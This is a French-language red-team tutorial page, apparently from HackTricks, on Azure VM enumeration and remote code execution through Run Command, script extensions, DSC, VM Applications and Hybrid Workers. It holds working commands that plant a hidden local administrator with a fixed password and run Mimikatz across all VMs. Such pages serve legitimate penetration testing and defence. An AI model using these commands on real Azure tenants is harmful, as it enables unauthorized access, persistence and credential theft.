# Az - Machines Virtuelles & R√©seau

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informations de base

Les machines virtuelles Azure sont l'un des types de [ressources informatiques √©volutives et √† la demande](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree) qu'Azure propose. Typiquement, vous choisissez une machine virtuelle lorsque vous avez besoin de plus de contr√¥le sur l'environnement informatique que les autres options offrent. Cet article vous fournit des informations sur ce que vous devez consid√©rer avant de cr√©er une machine virtuelle, comment la cr√©er et comment la g√©rer.

## Informations sur le R√©seau Azure

Les r√©seaux Azure contiennent **diff√©rentes entit√©s et mani√®res de les configurer.** Vous pouvez trouver une br√®ve **description,** **exemples** et **commandes d'√©num√©ration** des diff√©rentes entit√©s de r√©seau Azure dans :

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion** est un service enti√®rement g√©r√© qui fournit un **acc√®s RDP** (Remote Desktop Protocol) et **SSH** (Secure Shell) **s√©curis√© et transparent** √† vos **machines virtuelles directement dans le portail Azure via SSL**. Ce service est une alternative plus s√©curis√©e et pratique **√† l'exposition de vos machines virtuelles aux connexions Internet publiques**. Azure Bastion est provisionn√© au sein de votre R√©seau Virtuel Azure, offrant une connectivit√© RDP et SSH √† toutes les VMs dans le VNet en utilisant des adresses IP priv√©es, ce qui signifie que vous n'avez pas besoin d'attribuer des adresses IP publiques √† vos VMs Azure.

Ainsi, si votre entreprise h√©berge plusieurs VMs au sein d'un VNet Azure pour le d√©veloppement et les tests. **Au lieu de configurer des adresses IP publiques et de g√©rer des r√®gles NSG** pour chaque VM afin de permettre l'acc√®s RDP ou SSH, vous **d√©ployez Azure Bastion**. Avec Azure Bastion, vos d√©veloppeurs et personnel IT peuvent **acc√©der √† ces VMs depuis le portail Azure en utilisant leurs navigateurs web de mani√®re s√©curis√©e** sans avoir besoin d'adresses IP publiques.

Pour lister tous les h√¥tes Azure Bastion dans votre abonnement, vous pouvez utiliser la commande suivante :

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
## √ânum√©ration des VM
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **Ex√©cuter des commandes dans une VM**

### **Connexion AAD dans une VM**

Il est possible de permettre l'acc√®s aux utilisateurs authentifi√©s via AzureAD. Par exemple, pour essayer d'acc√©der √† une **VM linux** : `ssh username@azure-corp.com@1.1.1.1` (il est important **d'utiliser l'email** avec le azurecorp utilis√© lors de la tentative de connexion), vous pourriez obtenir une erreur comme :

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

Suivez simplement **ces instructions** en vous rendant sur [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) et en indiquant le code, utilisez l'email et le mot de passe comme identifiants et vous pourrez vous connecter via SSH (si cet utilisateur a suffisamment de permissions pour le faire : r√¥le `Virtual Machine Administrator Login` ou `Virtual Machine User Login`).

### **Run Command**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' ‚ÄìVerbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' ‚ÄìVerbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **Ex√©cuter l'extension de script personnalis√©**

Les extensions de machine virtuelle (VM) Azure sont de **petites applications** qui fournissent des t√¢ches de configuration et d'automatisation **apr√®s d√©ploiement** sur les **VMs Azure**. Par exemple, si une machine virtuelle n√©cessite l'installation d'un logiciel, une protection antivirus ou la capacit√© d'ex√©cuter un script √† l'int√©rieur, vous pouvez utiliser une extension VM.

Par cons√©quent, si vous avez acc√®s en √©criture, vous pouvez ex√©cuter du code arbitraire :
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState

**DesiredConfigurationState (DSC)** est similaire √† Ansible, mais c'est un outil dans PowerShell qui permet de configurer un h√¥te via du code. DSC a sa propre extension dans Azure qui permet de t√©l√©charger des **fichiers de configuration**. Les [fichiers de configuration](https://docs.microsoft.com/en-us/powershell/dsc/getting-started/wingettingstarted?view=dsc-1.1#define-a-configuration-and-generate-the-configuration-document) DSC sont assez pointilleux en ce qui concerne la syntaxe, cependant l'extension DSC est tr√®s cr√©dule et va **ex√©cuter aveugl√©ment toute commande** tant qu'elle suit un certain format, comme illustr√© dans la figure 5.

<figure><img src="../../../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

Cela peut √™tre fait via la fonction **Az PowerShell** [**`Publish-AzvmdscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0). L'extension DSC n√©cessite un **.PS1** avec une **fonction** et **emball√©** dans un fichier **.zip**. Puisque ce n'est pas la syntaxe DSC correcte, le statut de l'extension indiquera "√©chec", cependant le code sera ex√©cut√©. Le probl√®me est qu'il n'y a pas de sortie de la commande, car le statut est √©cras√© par le message d'√©chec.

### VM Application Definitions

La ressource [VM Applications](https://docs.microsoft.com/en-us/azure/virtual-machines/vm-applications) est un moyen de **d√©ployer des applications versionn√©es de mani√®re r√©p√©table** sur une VM Azure. Par exemple, si vous cr√©ez un **programme** et le **d√©ployez** sur toutes les VMs Azure en tant que version 1.0, une fois que vous **mettez √† jour** le programme **en 1.1**, vous pouvez utiliser la m√™me Application VM pour **cr√©er une autre d√©finition** et pousser la mise √† jour sur n'importe quelle VM.\
√ätre capable de **pousser une application** sur une VM signifie que c'est une autre voie pour l'**ex√©cution de code**. L'inconv√©nient de cette m√©thode est que la configuration de la D√©finition d'Application [**n√©cessite plusieurs √©tapes**](https://docs.microsoft.com/en-us/azure/virtual-machines/vm-applications-how-to?tabs=portal), mais peut √™tre accomplie en utilisant les cmdlets **`New-AzGalleryApplication`** et **`New-AzGalleryApplicationVersion`** dans Az PowerShell.

Cette technique fonctionne en utilisant une **extension "VMAppExtension"** qui est automatiquement install√©e lors de l'application d'une application sur une VM. L'extension t√©l√©charge le fichier depuis l'URI sur le disque sous le nom de l'Application _exactement_, ce qui signifie que si le nom de l'application est 'AzApplication', le fichier sur le disque s'appellera √©galement 'AzApplication' sans extension. Cela n√©cessite que le champ "ManageActions" dans l'appel [REST API](https://docs.microsoft.com/en-us/rest/api/compute/gallery-application-versions/create-or-update) soit configur√© pour renommer l'application avec l'extension appropri√©e. Si vous ne souhaitez pas ex√©cuter une application enti√®re, des commandes PowerShell arbitraires peuvent √™tre ex√©cut√©es en abusant √©galement du champ ManageActions dans la m√™me m√©thode REST API ou √©galement via le portail Azure. Une fois configur√©e, la d√©finition sera similaire √† la figure 8.

<figure><img src="../../../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

Cette technique d'ex√©cution est malheureusement lente (environ 3-4 minutes pour ex√©cuter une application ou une commande), cependant √©tant relativement nouvelle, je serais surpris s'il y a des d√©tections sp√©cifiques √©crites.

Puisque c'est une extension qui fait finalement l'ex√©cution, une copie de l'application se trouve √† `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` et le statut de l'ex√©cution est conserv√© dans `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\`.

### Hybrid Worker Groups

Les [**Hybrid Worker Groups**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) (HWGs) permettent √† un **Runbook** configur√© dans un compte d'automatisation d'√™tre **ex√©cut√©** sur une **machine virtuelle Azure** qui fait partie du **HWG configur√©**. Encore une fois, une **extension est utilis√©e** sur la VM pour d√©ployer le code Runbook sur la VM. Puisqu'une extension est utilis√©e, les identifiants sont sans importance et le code est ex√©cut√© en tant que **SYSTEM** ou root.

<figure><img src="../../../../.gitbook/assets/image (2) (5).png" alt=""><figcaption></figcaption></figure>

Si vous utilisez une VM Windows 10, il est important que le Runbook s'ex√©cute en tant que PowerShell Version 5.1 au lieu de 7.1, car 7.1 n'est pas install√© par d√©faut sur les VMs et le script √©chouera √† s'ex√©cuter.

## R√©f√©rences

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux repos github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
